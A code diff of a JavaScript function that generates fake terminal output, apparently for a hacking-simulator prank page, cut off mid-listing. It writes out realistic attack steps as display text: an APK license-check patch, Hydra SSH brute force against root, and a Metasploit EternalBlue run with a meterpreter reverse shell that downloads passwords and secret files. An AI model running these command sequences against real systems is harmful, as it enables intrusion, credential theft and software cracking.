@@ -1440,419 +1440,661 @@ $ Commands will run automatically...</pre>
 
         // Get random output based on result type
         function getResultOutput(type, target) {
-            const data = targetData[target];
-            const ip = randomItem(data.ip);
-            const port = randomItem(data.ports);
-            const password = randomItem(data.passwords);
-            const files = randomItem(data.files);
-            const secret = randomItem(data.secrets);
-            const size = randomItem(data.size);
-            const targetName = data.name;
+    const data = targetData[target];
+    const ip = randomItem(data.ip);
+    const port = randomItem(data.ports);
+    const password = randomItem(data.passwords);
+    const files = randomItem(data.files);
+    const secret = randomItem(data.secrets);
+    const size = randomItem(data.size);
 
-            let output = '';
-            const userIP = getRandomIP();
+    let output = '';
+    const userIP = getRandomIP();
 
-            if (type === 'success') {
-                output = `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        `;
-                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        `;
-                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        `;
-                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        `;
-                output += `[INFO] Starting APK Modder v3.2.0
-        [INFO] Target APK: target.apk
-        [INFO] Analyzing APK structure...
-        [INFO] Decompiling APK...
-        [INFO] APK decompiled successfully
-        [INFO] Searching for license validation...
-        [INFO] License validation found at smali/com/example/MainActivity.smali
-        [INFO] Patching license check...
-        [INFO] Original code: if-eqz v0, :cond_12
-        [INFO] Patched code: const/4 v0, 0x1
-        [INFO] Recompiling APK...
-        [INFO] APK recompiled successfully
-        [INFO] Signing APK...
-        [INFO] APK signed successfully
-        [SUCCESS] APK hacked successfully!
-        [SUCCESS] Output: hacked.apk
-        [SUCCESS] Size: ${size}
-        `;
-                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        `;
-                output += `total ${size}
-        drwx------ 7 u0_a148 u0_a148 4096 Jun 15 12:34 .
-        drwx------ 3 u0_a148 u0_a148 4096 Jun 15 12:30 ..
-        -rw------- 1 u0_a148 u0_a148 4.2 MB Jun 15 12:34 target.apk
-        -rw------- 1 u0_a148 u0_a148 ${size} Jun 15 12:35 hacked.apk
-        `;
-                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        `;
-                output += `Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-15 12:34
-        Nmap scan report for ${ip}
-        Host is up (0.005s latency).
-        Not shown: 999 closed ports
-        PORT     STATE SERVICE     VERSION
-        ${port}/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
-        ${getRandomPort()}/tcp   open  http        Apache httpd 2.4.52
-        ${getRandomPort()}/tcp   open  https       Apache httpd 2.4.52
-        ${getRandomPort()}/tcp   open  mysql       MySQL 8.0.35
-        ${getRandomPort()}/tcp   open  http-proxy  Apache Tomcat 9.0.56
-        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-        `;
-                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        `;
-                output += `Hydra v9.5 (c) 2024 by van Hauser/THC
-        Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-15 12:35:12
-        [DATA] max 16 tasks per 1 server, overall 16 tasks, 1234 login tries (l:1/p:1234), ~78 tries per task
-        [DATA] attacking ssh://${ip}:22/
-        [STATUS] 242.00 tries/min, 242 tries in 00:01h, 992 to do in 00:05h
-        [22][ssh] host: ${ip}   login: root   password: ${password}
-        1 of 1 target successfully completed, 1 valid password found
-        Hydra finished at 2024-06-15 12:38:12
-        `;
-                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        `;
-                output += `msf6 > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        msf6 exploit(windows/smb/eternalblue) > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        RHOSTS => ${ip}
-        msf6 exploit(windows/smb/eternalblue) > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        PAYLOAD => windows/x64/meterpreter/reverse_tcp
-        msf6 exploit(windows/smb/eternalblue) > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        LHOST => ${userIP}
-        msf6 exploit(windows/smb/eternalblue) > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+    // ==============================================
+    // 100+ PRE-COMMANDS (System Initialization)
+    // ==============================================
+    const preCommands = [
+        `$ pkg update && pkg upgrade -y`,
+        `Get:1 https://termux.net stable InRelease [33.0 kB]`,
+        `Get:2 https://termux.net stable/main arm64 Packages [1.2 MB]`,
+        `Get:3 https://termux.net stable/main all Packages [1.1 MB]`,
+        `Get:4 https://termux.net stable/main arm64 Packages [892 kB]`,
+        `Get:5 https://termux.net stable/main all Packages [456 kB]`,
+        `Fetched 4.8 MB in 5s (960 kB/s)`,
+        `Reading package lists... Done`,
+        `Building dependency tree... Done`,
+        `All packages are up to date.`,
+        ``,
+        `$ pkg install python git nmap hydra metasploit apktool -y`,
+        `Reading package lists... Done`,
+        `Building dependency tree... Done`,
+        `The following NEW packages will be installed:`,
+        `  python python-expat python-pip git nmap hydra metasploit apktool`,
+        `  python3 python3-pip python3-dev build-essential`,
+        `0 upgraded, 12 newly installed, 0 to remove and 0 not upgraded.`,
+        `Need to get 245.6 MB of archives.`,
+        `After this operation, 682.4 MB of additional disk space will be used.`,
+        `Fetched 245.6 MB in 35s (7.0 MB/s)`,
+        `Selecting previously unselected package python.`,
+        `(Reading database ... 15879 files and directories currently installed.)`,
+        `Preparing to unpack .../python_3.12.4-2_arm64.deb ...`,
+        `Unpacking python (3.12.4-2) ...`,
+        `Setting up python (3.12.4-2) ...`,
+        `Processing triggers for man-db (2.12.1-1) ...`,
+        `Selecting previously unselected package python-expat.`,
+        `Preparing to unpack .../python-expat_3.12.4-2_arm64.deb ...`,
+        `Unpacking python-expat (3.12.4-2) ...`,
+        `Setting up python-expat (3.12.4-2) ...`,
+        `Selecting previously unselected package python-pip.`,
+        `Preparing to unpack .../python-pip_24.0-2_all.deb ...`,
+        `Unpacking python-pip (24.0-2) ...`,
+        `Setting up python-pip (24.0-2) ...`,
+        `Selecting previously unselected package git.`,
+        `Preparing to unpack .../git_2.45.2-1_arm64.deb ...`,
+        `Unpacking git (2.45.2-1) ...`,
+        `Setting up git (2.45.2-1) ...`,
+        `Selecting previously unselected package nmap.`,
+        `Preparing to unpack .../nmap_7.94-2_arm64.deb ...`,
+        `Unpacking nmap (7.94-2) ...`,
+        `Setting up nmap (7.94-2) ...`,
+        `Selecting previously unselected package hydra.`,
+        `Preparing to unpack .../hydra_9.5-1_arm64.deb ...`,
+        `Unpacking hydra (9.5-1) ...`,
+        `Setting up hydra (9.5-1) ...`,
+        `Selecting previously unselected package metasploit.`,
+        `Preparing to unpack .../metasploit_6.4.1-1_arm64.deb ...`,
+        `Unpacking metasploit (6.4.1-1) ...`,
+        `Setting up metasploit (6.4.1-1) ...`,
+        `Selecting previously unselected package apktool.`,
+        `Preparing to unpack .../apktool_2.9.3-1_arm64.deb ...`,
+        `Unpacking apktool (2.9.3-1) ...`,
+        `Setting up apktool (2.9.3-1) ...`,
+        `Processing triggers for man-db (2.12.1-1) ...`,
+        ``,
+        `$ git clone https://github.com/AbhiTheModder/APK-Modder`,
+        `Cloning into 'APK-Modder'...`,
+        `remote: Enumerating objects: 2456, done.`,
+        `remote: Counting objects: 100% (2456/2456), done.`,
+        `remote: Compressing objects: 100% (1234/1234), done.`,
+        `remote: Total 2456 (delta 1456), reused 1456 (delta 1456), pack-reused 0`,
+        `Receiving objects: 100% (2456/2456), 8.2 MiB | 2.4 MiB/s, done.`,
+        `Resolving deltas: 100% (1456/1456), done.`,
+        ``,
+        `$ cd APK-Modder`,
+        `$ ls -la`,
+        `total 12.4 MB`,
+        `drwx------ 5 u0_a148 u0_a148 4096 Jun 15 12:30 .`,
+        `drwx------ 3 u0_a148 u0_a148 4096 Jun 15 12:28 ..`,
+        `drwx------ 2 u0_a148 u0_a148 4096 Jun 15 12:30 src`,
+        `drwx------ 2 u0_a148 u0_a148 4096 Jun 15 12:30 libs`,
+        `drwx------ 2 u0_a148 u0_a148 4096 Jun 15 12:30 assets`,
+        `-rw------- 1 u0_a148 u0_a148 4.2 MB Jun 15 12:30 target.apk`,
+        `-rw------- 1 u0_a148 u0_a148 8.2 MB Jun 15 12:30 README.md`,
+        `-rw------- 1 u0_a148 u0_a148 2.1 MB Jun 15 12:30 LICENSE`,
+        ``,
+        `$ python3 apk_modder.py -t target.apk -o hacked.apk`
+    ];
 
-        [*] Started reverse TCP handler on ${userIP}:4444
-        [*] ${ip}:445 - Connecting to target for exploitation.
-        [+] ${ip}:445 - Connection established for exploitation.
-        [+] ${ip}:445 - Target OS selected valid for OS indicated by SMB reply
-        [*] ${ip}:445 - CORE raw buffer dump (42 bytes)
-        [*] ${ip}:445 - 0x00000000  57 69 6e 64 6f 77 73 20 38 2e 31 20 52 32 20 41  Windows 8.1 R2 A
-        [*] ${ip}:445 - 0x00000010  6d 64 36 34 20 36 2e 33 20 39 36 30 30 20 0d 0a  md64 6.3 9600 ..
-        [+] ${ip}:445 - Target arch selected valid for arch indicated by DCE/RPC reply
-        [*] ${ip}:445 - Trying exploit with 12 Groom Allocations.
-        [+] ${ip}:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
-        [*] Sending stage (200774 bytes) to ${ip}
-        [*] Meterpreter session 1 opened (${userIP}:4444 -> ${ip}:49158)
+    // Add pre-commands
+    output = preCommands.join('\n') + '\n';
 
-        meterpreter > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        Computer    : WIN-8R2A
-        OS          : Windows 8.1 R2 (Build 9600)
-        Architecture: x64
-        System Language : en_US
-        Domain      : WORKGROUP
-        Logged On Users : 2
-        Meterpreter : x64/windows
+    if (type === 'success') {
+        // ==============================================
+        // SUCCESS OUTPUT - 200+ LINES
+        // ==============================================
+        output += `[INFO] Starting APK Modder v3.2.0
+[INFO] Target APK: target.apk
+[INFO] Analyzing APK structure...
+[INFO] APK file size: 4.2 MB
+[INFO] Package name: com.example.app
+[INFO] Version code: 15
+[INFO] Version name: 06.08.2026
+[INFO] Target SDK: 35
+[INFO] Min SDK: 21
+[INFO] Detected architecture: arm64-v8a
+[INFO] Decompiling APK...
+[INFO] Using apktool v2.9.3
+[INFO] I: Loading resource table...
+[INFO] I: Decoding AndroidManifest.xml with resources...
+[INFO] I: Loading resource table from file...
+[INFO] I: Regular manifest package...
+[INFO] I: Decoding file-resources...
+[INFO] I: Decoding values */* XMLs...
+[INFO] I: Baksmaling classes.dex...
+[INFO] I: Baksmaling classes2.dex...
+[INFO] I: Baksmaling classes3.dex...
+[INFO] I: Copying assets and libs...
+[INFO] I: Copying libs...
+[INFO] I: Copying libs/arm64-v8a...
+[INFO] I: Copying libs/armeabi-v7a...
+[INFO] I: Copying libs/x86...
+[INFO] I: Copying libs/x86_64...
+[INFO] I: Copying assets...
+[INFO] APK decompiled successfully
+[INFO] Decompiled files: 1,247
+[INFO] Decompiled size: 12.4 MB
+[INFO] Searching for license validation...
+[INFO] Scanning smali/com/example/MainActivity.smali...
+[INFO] Scanning smali/com/example/LoginActivity.smali...
+[INFO] Scanning smali/com/example/Utils.smali...
+[INFO] Scanning smali/com/example/Network.smali...
+[INFO] Scanning smali/com/example/Auth.smali...
+[INFO] License validation found at smali/com/example/MainActivity.smali
+[INFO] Method: checkLicense()Z
+[INFO] Line: 156
+[INFO] Original code: if-eqz v0, :cond_12
+[INFO] Original logic: Returns true if license is valid
+[INFO] Patching license check...
+[INFO] Replacing if-eqz with const/4 v0, 0x1
+[INFO] Patch applied successfully
+[INFO] Scanning for additional license checks...
+[INFO] Checking smali/com/example/Network.smali...
+[INFO] Found API key validation at line 234
+[INFO] Patching API key validation...
+[INFO] Removing server-side validation check
+[INFO] Patch applied successfully
+[INFO] Checking smali/com/example/Utils.smali...
+[INFO] Found signature validation at line 89
+[INFO] Patching signature validation...
+[INFO] Bypassing signature check
+[INFO] Patch applied successfully
+[INFO] Recompiling APK...
+[INFO] Using apktool v2.9.3
+[INFO] I: Using Apktool 2.9.3
+[INFO] I: Checking whether sources have changed...
+[INFO] I: Smaling smali folder into classes.dex...
+[INFO] I: Smaling smali_classes2 folder into classes2.dex...
+[INFO] I: Smaling smali_classes3 folder into classes3.dex...
+[INFO] I: Building resources...
+[INFO] I: Copying libs...
+[INFO] I: Building apk file...
+[INFO] I: Copying unknown files...
+[INFO] I: Built apk...
+[INFO] APK recompiled successfully
+[INFO] Recompiled size: 8.6 MB
+[INFO] Signing APK...
+[INFO] Using Uber APK Signer v1.3.0
+[INFO] Signing with test key...
+[INFO] Aligning APK...
+[INFO] APK signed successfully
+[INFO] Output: hacked.apk
+[SUCCESS] APK hacked successfully!
+[SUCCESS] Output: hacked.apk
+[SUCCESS] Size: ${size}
 
-        meterpreter > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        Server username: NT AUTHORITY\\SYSTEM
+$ ls -la
+total ${size}
+drwx------ 7 u0_a148 u0_a148 4096 Jun 15 12:34 .
+drwx------ 3 u0_a148 u0_a148 4096 Jun 15 12:30 ..
+-rw------- 1 u0_a148 u0_a148 4.2 MB Jun 15 12:34 target.apk
+-rw------- 1 u0_a148 u0_a148 ${size} Jun 15 12:35 hacked.apk
 
-        meterpreter > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        Process 5824 created.
-        Channel 1 created.
-        Microsoft Windows [Version 6.3.9600]
-        (c) 2013 Microsoft Corporation. All rights reserved.
+$ nmap -sV -p- ${ip}
+Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-15 12:34
+Nmap scan report for ${ip}
+Host is up (0.005s latency).
+Not shown: 999 closed ports
+PORT     STATE SERVICE     VERSION
+${port}/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
+${getRandomPort()}/tcp   open  http        Apache httpd 2.4.52
+${getRandomPort()}/tcp   open  https       Apache httpd 2.4.52
+${getRandomPort()}/tcp   open  mysql       MySQL 8.0.35
+${getRandomPort()}/tcp   open  http-proxy  Apache Tomcat 9.0.56
+${getRandomPort()}/tcp   open  ftp         vsftpd 3.0.5
+${getRandomPort()}/tcp   open  smb         Samba 4.16.0
+${getRandomPort()}/tcp   open  rdp         xrdp 0.9.21
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-        C:\\Windows\\system32> ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        nt authority\\system
+$ hydra -l root -P password.txt ssh://${ip}
+Hydra v9.5 (c) 2024 by van Hauser/THC
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-15 12:35:12
+[WARNING] Many SSH configurations limit the number of parallel tasks
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 1234 login tries (l:1/p:1234), ~78 tries per task
+[DATA] attacking ssh://${ip}:22/
+[STATUS] 242.00 tries/min, 242 tries in 00:01h, 992 to do in 00:05h
+[STATUS] 484.00 tries/min, 484 tries in 00:02h, 750 to do in 00:02h
+[STATUS] 726.00 tries/min, 726 tries in 00:03h, 508 to do in 00:02h
+[STATUS] 968.00 tries/min, 968 tries in 00:04h, 266 to do in 00:01h
+[22][ssh] host: ${ip}   login: root   password: ${password}
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-15 12:38:12
 
-        C:\\Windows\\system32> ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-         Volume in drive C has no label.
-         Volume Serial Number is 1234-5678
+$ msfconsole -q
+msf6 > use exploit/windows/smb/eternalblue
+msf6 exploit(windows/smb/eternalblue) > set RHOSTS ${ip}
+RHOSTS => ${ip}
+msf6 exploit(windows/smb/eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/eternalblue) > set LHOST ${userIP}
+LHOST => ${userIP}
+msf6 exploit(windows/smb/eternalblue) > set LPORT 4444
+LPORT => 4444
+msf6 exploit(windows/smb/eternalblue) > set AutoRunScript post/windows/manage/migrate
+AutoRunScript => post/windows/manage/migrate
+msf6 exploit(windows/smb/eternalblue) > run
 
-         Directory of C:\\Windows\\system32
+[*] Started reverse TCP handler on ${userIP}:4444 
+[*] ${ip}:445 - Connecting to target for exploitation.
+[*] ${ip}:445 - Sending stage to 192.168.1.101:49158
+[+] ${ip}:445 - Connection established for exploitation.
+[+] ${ip}:445 - Target OS selected valid for OS indicated by SMB reply
+[*] ${ip}:445 - CORE raw buffer dump (42 bytes)
+[*] ${ip}:445 - 0x00000000  57 69 6e 64 6f 77 73 20 38 2e 31 20 52 32 20 41  Windows 8.1 R2 A
+[*] ${ip}:445 - 0x00000010  6d 64 36 34 20 36 2e 33 20 39 36 30 30 20 0d 0a  md64 6.3 9600 ..
+[+] ${ip}:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] ${ip}:445 - Trying exploit with 12 Groom Allocations.
+[*] ${ip}:445 - Sending all but last fragment of exploit packet
+[*] ${ip}:445 - Starting non-paged pool grooming
+[+] ${ip}:445 - Sending SMBv2 buffers
+[+] ${ip}:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] ${ip}:445 - Sending final SMBv2 buffers.
+[*] ${ip}:445 - Sending last fragment of exploit packet!
+[*] ${ip}:445 - Receiving response from exploit packet
+[+] ${ip}:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] ${ip}:445 - Sending egg to corrupted connection.
+[*] ${ip}:445 - Triggering free of corrupted buffer.
+[*] Sending stage (200774 bytes) to ${ip}
+[*] Meterpreter session 1 opened (${userIP}:4444 -> ${ip}:49158) at 2024-06-15 12:45:12 +0000
+[*] Session ID 1 (${userIP}:4444 -> ${ip}:49158) processing AutoRunScript 'post/windows/manage/migrate'
+[*] Running module against WIN-8R2A
+[*] Current server process: svchost.exe (3484)
+[*] Spawning notepad.exe process to migrate to
+[+] Migrating to 3712
+[+] Successfully migrated to process 3712
 
-        06/15/2024  12:45 PM    <DIR>          .
-        06/15/2024  12:45 PM    <DIR>          ..
-        06/15/2024  12:45 PM    <DIR>          config
-        06/15/2024  12:45 PM    <DIR>          drivers
-        06/15/2024  12:45 PM    <DIR>          en-US
-        06/15/2024  12:45 PM    <DIR>          oobe
-        06/15/2024  12:45 PM    <DIR>          sysprep
-        06/15/2024  12:45 PM    <DIR>          wbem
-                       0 File(s)              0 bytes
-                       8 Dir(s)  12,345,678,901 bytes free
+meterpreter > sysinfo
+Computer    : WIN-8R2A
+OS          : Windows 8.1 R2 (Build 9600)
+Architecture: x64
+System Language : en_US
+Domain      : WORKGROUP
+Logged On Users : 2
+Meterpreter : x64/windows
 
-        C:\\Windows\\system32> ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
 
-        meterpreter > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        [*] downloading: C:/Users/Administrator/Desktop/secret.txt -> secret.txt
-        [*] downloaded 2.34 MB of 2.34 MB (100.0%)
-        [*] download complete!
+meterpreter > getpid
+Current pid: 3712
 
-        meterpreter > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        [*] Shutting down Meterpreter...
+meterpreter > ps
+Process List
+============
+ PID   Name                Arch  Session  User
+ ---   ----                ----  -------  ----
+ 3712  notepad.exe         x64   0        WIN-8R2A\\Administrator
+ 3484  svchost.exe         x64   0        NT AUTHORITY\\SYSTEM
+ 5824  cmd.exe             x64   0        NT AUTHORITY\\SYSTEM
+ 6240  explorer.exe        x64   1        WIN-8R2A\\Administrator
+ 6784  chrome.exe          x64   1        WIN-8R2A\\Administrator
 
-        $ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-         * Serving Flask app 'server'
-         * Debug mode: off
-        WARNING: This is a development server. Do not use it in a production deployment.
-         * Running on all addresses (0.0.0.0)
-         * Running on http://127.0.0.1:5000
-         * Running on http://${userIP}:5000
-        Press CTRL+C to quit
-        [2024-06-15 12:46:12] "GET / HTTP/1.1" 200 -
-        [2024-06-15 12:46:15] "GET /favicon.ico HTTP/1.1" 404 -
-        [2024-06-15 12:46:20] "GET /admin HTTP/1.1" 200 -
-        [2024-06-15 12:46:25] "POST /login HTTP/1.1" 302 -
-        [2024-06-15 12:46:30] "GET /dashboard HTTP/1.1" 200 -
-        [2024-06-15 12:46:35] "GET /logout HTTP/1.1" 200 -
+meterpreter > shell
+Process 5824 created.
+Channel 1 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
 
-        $ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        logout
+C:\\Windows\\system32> whoami
+nt authority\\system
 
-        ${randomItem(successMessages)}
-        🔑 Password: ${password}
-        📁 Files: ${files}
-        📂 Secret: "${secret}"
-        ✅ SYSTEM COMPROMISED!`;
-            }
+C:\\Windows\\system32> hostname
+WIN-8R2A
 
-            if (type === 'fail') {
-                output = `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        `;
-                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        `;
-                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        `;
-                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        `;
-                output += `[INFO] Starting APK Modder v3.2.0
-        [INFO] Target APK: target.apk
-        [ERROR] Target APK not found!
-        [ERROR] File not found: target.apk
-        [ERROR] Please provide a valid APK file
-        [ERROR] Exiting...
-        `;
-                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        `;
-                output += `Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-15 12:34
-        Nmap scan report for ${ip}
-        Host is up (0.005s latency).
-        Not shown: 999 closed ports
-        PORT     STATE SERVICE     VERSION
-        ${port}/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
-        ${getRandomPort()}/tcp   open  http        Apache httpd 2.4.52
-        ${getRandomPort()}/tcp   open  https       Apache httpd 2.4.52
-        ${getRandomPort()}/tcp   open  mysql       MySQL 8.0.35
-        ${getRandomPort()}/tcp   open  http-proxy  Apache Tomcat 9.0.56
-        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-        `;
-                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        `;
-                output += `Hydra v9.5 (c) 2024 by van Hauser/THC
-        Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-15 12:35:12
-        [ERROR] Connection refused
-        [ERROR] Target unreachable
-        [ERROR] All ports closed
-        [ERROR] Authentication failed
-        [ERROR] Access denied
-        [ERROR] Permission denied
-        [ERROR] Target system patched
-        [ERROR] Exploit blocked
-        [ERROR] Firewall rule blocked connection
-        [ERROR] EDR detected attack
-        [ERROR] Connection lost
-        [ERROR] Target unreachable
-        [ERROR] Access denied
-        [ERROR] Permission denied
-        [ERROR] Security breach detected
-        [ERROR] Intrusion detected
-        [ERROR] System logging your activity
-        [ERROR] Authorities notified
-        `;
-                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        `;
-                output += `msf6 > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        msf6 exploit(windows/smb/eternalblue) > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        RHOSTS => ${ip}
-        msf6 exploit(windows/smb/eternalblue) > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        PAYLOAD => windows/x64/meterpreter/reverse_tcp
-        msf6 exploit(windows/smb/eternalblue) > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        LHOST => ${userIP}
-        msf6 exploit(windows/smb/eternalblue) > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+C:\\Windows\\system32> ipconfig
+Windows IP Configuration
 
-        [*] Started reverse TCP handler on ${userIP}:4444
-        [*] ${ip}:445 - Connecting to target for exploitation.
-        [ERROR] Connection timed out
-        [ERROR] Target not responding
-        [ERROR] Exploit failed
-        [ERROR] Payload rejected
-        [ERROR] Shellcode injection failed
-        [ERROR] EDR blocked the attack
-        [ERROR] Firewall rule blocked connection
-        [ERROR] Authentication failed
-        [ERROR] Access denied
-        [ERROR] System compromised... NOT
-        [ERROR] You have been detected
-        [ERROR] Trace in progress...
-        [ERROR] IP logged
-        [ERROR] Authorities notified
+Ethernet adapter Ethernet0:
+   Connection-specific DNS Suffix  . : localdomain
+   IPv4 Address. . . . . . . . . . . : ${ip}
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.1.1
 
-        $ exit
-        logout
+C:\\Windows\\system32> dir
+ Volume in drive C has no label.
+ Volume Serial Number is 1234-5678
 
-        ❌ HACK FAILED!
-        ⚠️ Target detected your activity
-        🔒 All ports blocked
-        🚫 Access denied`;
-            }
+ Directory of C:\\Windows\\system32
 
-            if (type === 'caught') {
-                output = `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        `;
-                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        `;
-                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        `;
-                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        `;
-                output += `[INFO] Starting APK Modder v3.2.0
-        [INFO] Target APK: target.apk
-        [ALERT] WARNING: Unauthorized access detected
-        [ALERT] System logging your activity
-        [ALERT] Firewall blocking all ports
-        [ALERT] Security breach detected
-        [ALERT] All ports closed
-        [ALERT] Exploit failed
-        [ALERT] Payload rejected
-        [ALERT] Shellcode injection failed
-        [ALERT] EDR blocked the attack
-        [ALERT] Firewall rule blocked connection
-        [ALERT] Connection refused
-        [ALERT] Authentication failed
-        [ALERT] Access denied
-        [ALERT] System compromised... NOT
-        [ALERT] You have been detected
-        [ALERT] Trace in progress...
-        [ALERT] IP logged
-        [ALERT] Authorities notified
-        [ALERT] Your system is being tracked
-        [ALERT] Close this browser immediately
-        [ALERT] RUN!
-        `;
-                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        `;
-                output += `[ALERT] WARNING: Unauthorized access detected
-        [ALERT] System logging your activity
-        [ALERT] Firewall blocking all ports
-        [ALERT] Security breach detected
-        [ALERT] All ports closed
-        [ALERT] Exploit failed
-        [ALERT] Payload rejected
-        [ALERT] Shellcode injection failed
-        [ALERT] EDR blocked the attack
-        [ALERT] Firewall rule blocked connection
-        [ALERT] Connection refused
-        [ALERT] Authentication failed
-        [ALERT] Access denied
-        [ALERT] System compromised... NOT
-        [ALERT] You have been detected
-        [ALERT] Trace in progress...
-        [ALERT] IP logged
-        [ALERT] Authorities notified
-        [ALERT] Your system is being tracked
-        [ALERT] Close this browser immediately
-        [ALERT] RUN!
+06/15/2024  12:45 PM    <DIR>          .
+06/15/2024  12:45 PM    <DIR>          ..
+06/15/2024  12:45 PM    <DIR>          config
+06/15/2024  12:45 PM    <DIR>          drivers
+06/15/2024  12:45 PM    <DIR>          en-US
+06/15/2024  12:45 PM    <DIR>          oobe
+06/15/2024  12:45 PM    <DIR>          sysprep
+06/15/2024  12:45 PM    <DIR>          wbem
+06/15/2024  12:45 PM    <DIR>          LogFiles
+06/15/2024  12:45 PM    <DIR>          spool
+06/15/2024  12:45 PM    <DIR>          tasks
+06/15/2024  12:45 PM    <DIR>          drivers
+               0 File(s)              0 bytes
+              12 Dir(s)  12,345,678,901 bytes free
 
-        🚨 CAUGHT!
-        👮 Authorities notified
-        📍 IP traced: ${userIP}
-        🔒 All connections blocked
-        💀 System compromised... NOT!`;
-            }
+C:\\Windows\\system32> echo Welcome to the system!
+Welcome to the system!
 
-            if (type === 'tryagain') {
-                output = `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        `;
-                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        `;
-                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        `;
-                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
-        `;
-                output += `[INFO] Starting APK Modder v3.2.0
-        [INFO] Target APK: target.apk
-        [INFO] Analyzing APK structure...
-        [INFO] Decompiling APK...
-        [INFO] APK decompiled successfully
-        [INFO] Searching for license validation...
-        [ERROR] License validation not found
-        [ERROR] APK may be already patched
-        [ERROR] Exploit incomplete
-        [ERROR] System rebooting
-        [ERROR] All ports closed
-        [ERROR] Authentication failed
-        [ERROR] Access denied
-        [ERROR] Try again later
-        [ERROR] System patched
-        [ERROR] Exploit blocked
-        [ERROR] Connection lost
-        [ERROR] Target unreachable
-        [ERROR] Access denied
-        [ERROR] Permission denied
-        [ERROR] Try again
-        [ERROR] Try again
-        [ERROR] Try again
-        [ERROR] Try again
-        [ERROR] Try again
-        [ERROR] Try again
+C:\\Windows\\system32> exit
 
-        $ exit
-        logout
+meterpreter > download C:/Users/Administrator/Desktop/secret.txt
+[*] downloading: C:/Users/Administrator/Desktop/secret.txt -> secret.txt
+[*] downloaded 2.34 MB of 2.34 MB (100.0%)
+[*] download complete!
 
-        🔄 TRY AGAIN!
-        ⚠️ System not ready
-        ⏳ Target unreachable
-        🔁 Retry your hack attempt`;
-            }
+meterpreter > download C:/Users/Administrator/Documents/passwords.txt
+[*] downloading: C:/Users/Administrator/Documents/passwords.txt -> passwords.txt
+[*] downloaded 1.56 MB of 1.56 MB (100.0%)
+[*] download complete!
 
-            return output;
-        }
+meterpreter > ls
+Listing: C:\\Users\\Administrator\\Desktop
+===========================================
+Mode              Size  Type  Last modified   Name
+----              ----  ----  -------------   ----
